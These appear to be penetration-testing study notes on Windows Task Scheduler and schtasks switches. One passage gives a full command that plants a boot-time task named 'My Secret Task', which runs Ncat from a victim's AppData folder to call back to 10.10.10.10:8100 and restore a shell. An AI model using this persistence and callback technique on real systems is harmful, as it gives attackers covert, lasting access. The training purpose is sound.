# Windows Scheduled Tasks

Task Scheduler allows an administrator to configure tasks to run when a set of conditions are met. This is a convenient tool that can also be exploited by attackers if it is not properly monitored and logged. 

### Task Triggers

Scheduled Tasks are initialized when a set of triggers occur, causing the task to begin. Common triggers for scheduled tasks include:

- When a system event occurs
- At a specific time
- When a designated amount of time has passed
- When the computer is idle
- When the task is registered
- When the system boots
- When a user logs on
- When the Terminal Server session changes state

### Schtasks

The schtasks command is used to schedule tasks. You can learn more with the following command:

>schtasks /?

There are various switches we can use to retrieve different information about the tasks already in the system database. Here is a list of the commands and switches relevant to schtasks:
#### Query Syntax


- Query - this command searches the target host to determine if a specified task exists.
- /fo - sets the formatting of the tasks to Table, List, or #CSV 
- /v - displays verbose output about the advanced properties of tasks when in List or CSV mode.
- /nh - removes column headers and presents simplified output in List or #CSV format.
- /s - sets a #DNS name or #IP address in lieu of the default value of LocaHost. This is used to connect to a remote host and must format this as \\\\host.
- /u - runs commands based on the permission set of a specified user.
- /p - sets a password for command execution. Must be used when using the /p and /u switches.

#### Create Syntax

The first four commands and switches presented here MUST be used. All others are optional.

- Create - this command schedules a task.
- /sc - sets the schedule type and rate of recurrence.
- /tn - sets the name of a task, which must be unique.
- /tr - sets the trigger of the task, which may be an executable, script, or batch file.
- /s - specifies the host to run on.
- /u - specifies the user to utilize.
- /p - sets the password of the user-specified
- /mo - sets a modifier to run within the schedule.
- /rl - limits the privileges of the task to either Limited or Highest, with Limited set as default.
- /z - deletes the task after initial execution.

We will use the following command to create a task that executes #Ncat locally in the user's AppData directory, which will connect to host 10.10.10.10 on port 8100. This will perform a callback every time the machine boots - so if we establish a shell on the target but it is ended when the machine shuts down, we will be notified so we can reinstate our shell on the target.

Implement the above task with the following command:

>schtasks /create /sc ONSTART /tn "My Secret Task" /tr "C:\\Users\\Victim\\AppData\\Local\\ncat.exe 10.10.10.10 8100"

#### Change Syntax 

- Change - this command modifies an existing scheduled task.
- /tn - identifies the task being changed.
- /tr - modifies the program or action the task will run.
- /ENABLE - changes the state of the task to enabled.
- /DISABLE - changes the state of the task to disabled.
- 
You can simply run schtasks /run to start the task without triggers.

#### Delete Syntax

- Delete - deletes a scheduled task.
- /tn - identifies which task will be deleted.
- /s - specifies a name or IP address to delete the task from.
- /u - indicates the user to run the task under.
- /p - indicates the password to run the task as.
- /f - stops the confirmation warning.

You can simply run schtasks /delete if you choose. 
### Related:

- [Hack The Box Academy](https://academy.hackthebox.com/ 'hack the box academy home page')
- [HTB Academy Windows Scheduled Tasks](https://academy.hackthebox.com/module/167/section/1613 'HTB academy managing windows scheduled tasks module')
- [012 Windows Command Line Tools](012%20Windows%20Command%20Line%20Tools.md)
- [012 Windows Network Command Line](012%20Windows%20Network%20Command%20Line.md)
- [013 Additional Windows Tools](013%20Additional%20Windows%20Tools.md)
- [015 Windows Settings](015%20Windows%20Settings.md)
- [031 Troubleshooting Windows](031%20Troubleshooting%20Windows.md)
- [018 File Systems](018%20File%20Systems.md)